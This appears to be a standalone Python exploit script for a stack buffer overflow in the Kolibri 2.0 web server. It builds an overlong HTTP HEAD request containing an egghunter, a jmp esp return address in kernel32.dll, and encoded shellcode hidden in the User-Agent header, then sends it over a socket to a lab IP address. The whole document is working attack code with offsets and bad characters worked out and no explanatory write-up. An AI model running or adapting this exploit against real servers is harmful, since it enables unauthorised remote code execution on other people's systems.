#!/usr/bin/python -w
###############################################################################################################
#   Author: Tiago Carvalho 
#   Kolibri 2.0 Head Overflow
#   011FF921   41               INC ECX be
###############################################################################################################
from struct import pack
import socket
import os
import sys

###############################################################################################################
# Bad Char's \x00\x0d\x0a\x3d\x20\x3f
###############################################################################################################
egghunter = (
"\x66\x81\xca\xff"
"\x0f\x42\x52\x6a"
"\x02\x58\xcd\x2e"
"\x3c\x05\x5a\x74"
"\xef\xb8\x54\x30"
"\x30\x57\x8b\xfa"
"\xaf\x75\xea\xaf"
"\x75\xe7\xff\xe7"
)

###############################################################################################################
# Bad Char's
###############################################################################################################
shellcode = (
"T00WT00W"
"\xb8\x8f\x59\x98\xbd\xdb\xd6\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
"\x53\x31\x42\x12\x83\xea\xfc\x03\xcd\x57\x7a\x48\x2d\x8f\xf8"
"\xb3\xcd\x50\x9d\x3a\x28\x61\x9d\x59\x39\xd2\x2d\x29\x6f\xdf"
"\xc6\x7f\x9b\x54\xaa\x57\xac\xdd\x01\x8e\x83\xde\x3a\xf2\x82"
"\x5c\x41\x27\x64\x5c\x8a\x3a\x65\x99\xf7\xb7\x37\x72\x73\x65"
"\xa7\xf7\xc9\xb6\x4c\x4b\xdf\xbe\xb1\x1c\xde\xef\x64\x16\xb9"
"\x2f\x87\xfb\xb1\x79\x9f\x18\xff\x30\x14\xea\x8b\xc2\xfc\x22"
"\x73\x68\xc1\x8a\x86\x70\x06\x2c\x79\x07\x7e\x4e\x04\x10\x45"
"\x2c\xd2\x95\x5d\x96\x91\x0e\xb9\x26\x75\xc8\x4a\x24\x32\x9e"
"\x14\x29\xc5\x73\x2f\x55\x4e\x72\xff\xdf\x14\x51\xdb\x84\xcf"
"\xf8\x7a\x61\xa1\x05\x9c\xca\x1e\xa0\xd7\xe7\x4b\xd9\xba\x6f"
"\xbf\xd0\x44\x70\xd7\x63\x37\x42\x78\xd8\xdf\xee\xf1\xc6\x18"
"\x10\x28\xbe\xb6\xef\xd3\xbf\x9f\x2b\x87\xef\xb7\x9a\xa8\x7b"
"\x47\x22\x7d\x11\x4f\x85\x2e\x04\xb2\x75\x9f\x88\x1c\x1e\xf5"
"\x06\x43\x3e\xf6\xcc\xec\xd7\x0b\xef\x03\x74\x85\x09\x49\x94"
"\xc3\x82\xe5\x56\x30\x1b\x92\xa9\x12\x33\x34\xe1\x74\x84\x3b"
"\xf2\x52\xa2\xab\x79\xb1\x76\xca\x7d\x9c\xde\x9b\xea\x6a\x8f"
"\xee\x8b\x6b\x9a\x98\x28\xf9\x41\x58\x26\xe2\xdd\x0f\x6f\xd4"
"\x17\xc5\x9d\x4f\x8e\xfb\x5f\x09\xe9\xbf\xbb\xea\xf4\x3e\x49"
"\x56\xd3\x50\x97\x57\x5f\x04\x47\x0e\x09\xf2\x21\xf8\xfb\xac"
"\xfb\x57\x52\x38\x7d\x94\x65\x3e\x82\xf1\x13\xde\x33\xac\x65"
"\xe1\xfc\x38\x62\x9a\xe0\xd8\x8d\x71\xa1\xe9\xc7\xdb\x80\x61"
"\x8e\x8e\x90\xef\x31\x65\xd6\x09\xb2\x8f\xa7\xed\xaa\xfa\xa2"
"\xaa\x6c\x17\xdf\xa3\x18\x17\x4c\xc3\x08")


###############################################################################################################
#   0x7c86467b : jmp esp |  
#   {PAGE_EXECUTE_READ} [kernel32.dll] (C:\WINDOWS\system32\kernel32.dll)
#   ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.5512 
###############################################################################################################

RET = pack("<L", 0x7c86467b)

###############################################################################################################
# JUMP BAC
# 60 = 3C
# -60 = C4
# 013EFAEE   41               INC ECX - LANDING
# 013EF921   41               INC ECX - Beguining
# 011FFB28  ^EB C4            JMP SHORT 011FFAEE
# 013EFAEE - 013EF921 = 1CD = 461
###############################################################################################################
JMPBACK = "\xEB\x06"

###############################################################################################################
#   Bad Char's \x00\x0d\x0a\x3d\x20\x3f
#   Buffer size 600
#   EIP offset 515
#   011FF921   41               INC ECX  - Begining of the buffer
#   011FFB24   7B 46            JPO SHORT 011FFB6C - LANDING 
#   Egghunter 32
#   461 + 32 = 493  
###############################################################################################################

stage1 = "A" * 461 + egghunter +"A" * 22 + RET + JMPBACK

buffer = (
"HEAD /" + stage1 + " HTTP/1.1\r\n"
"Host:  172.16.206.132:8080\r\n"
"User-Agent: " + shellcode + "\r\n"
"Keep-Alive: 115\r\n"
"Connection: keep-alive\r\n\r\n")
 
expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect(("172.16.206.132", 8080))
expl.send(buffer)
expl.close()